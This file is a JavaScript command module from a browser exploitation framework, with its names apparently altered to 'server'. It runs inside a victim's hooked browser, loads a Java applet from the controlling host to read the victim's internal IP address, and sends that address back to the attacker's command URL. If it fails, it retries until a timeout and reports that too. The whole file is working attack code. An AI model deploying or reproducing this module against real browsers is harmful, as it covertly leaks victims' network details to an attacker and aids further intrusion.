//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

    var applet_uri = server.net.httpproto + '://'+server.net.host+ ':' + server.net.port + '/';
	var internal_counter = 0;
	var timeout = 30;
    var output;
    server.dom.attachApplet('get_internal_ip', 'get_internal_ip', 'get_internal_ip' ,
        applet_uri, null, null);

    function waituntilok() {
        try {
            output = document.get_internal_ip.ip();
            server.net.send('<%= @command_url %>', <%= @command_id %>, output);
				server.dom.detachApplet('get_internal_ip');
				return;
			} catch (e) {
				internal_counter++;
				if (internal_counter > timeout) {
					server.net.send('<%= @command_url %>', <%= @command_id %>, 'Timeout after '+timeout+' seconds');
					server.dom.detachApplet('get_internal_ip');
					return;
				}
				setTimeout(function() {waituntilok()},1000);
			}
	}

	setTimeout(function() {waituntilok()},5000);

});
